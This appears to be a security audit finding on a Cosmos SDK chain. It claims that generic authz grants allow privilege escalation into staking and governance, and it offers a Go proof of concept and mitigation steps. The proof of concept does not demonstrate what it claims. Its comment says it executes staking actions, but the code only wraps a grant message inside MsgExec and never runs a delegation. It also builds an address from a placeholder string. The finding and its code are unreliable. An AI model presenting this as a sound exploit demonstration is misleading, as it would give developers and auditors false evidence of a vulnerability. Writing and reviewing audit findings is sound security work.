# Vulnerability details

## Finding description and impact
Overly Broad Generic Grants
Root Cause: The code permits generic grants (authz.NewGenericAuthorization) for non-EVM messages without sufficient granularity or constraints. This creates potential for privilege escalation, where grants are misused for unintended purposes.

Impact: Users might exploit generic grants to perform unauthorized operations, including staking and governance actions.

## Proof of Concept
// Abusing generic grants for staking operations
someTime := time.Now()
expiryTime := someTime.Add(time.Hour)
genericGrant, err := authz.NewGrant(
    someTime,
    authz.NewGenericAuthorization(sdk.MsgTypeURL(&stakingtypes.MsgDelegate{})),
    &expiryTime,
)
if err != nil {
    log.Fatalf("Grant creation failed: %v", err)
}
msgGrant := &authz.MsgGrant{Grant: genericGrant}

// Executing staking actions using generic grant
msgExec := authz.NewMsgExec(
    sdk.AccAddress("malicioususer"),
    []sdk.Msg{
        msgGrant,
    },
)

## Recommended mitigation steps
1. Prohibit generic grants for critical modules (e.g., staking, governance).
2. Implement specific, restrictive grants for such operations to ensure explicit intent.
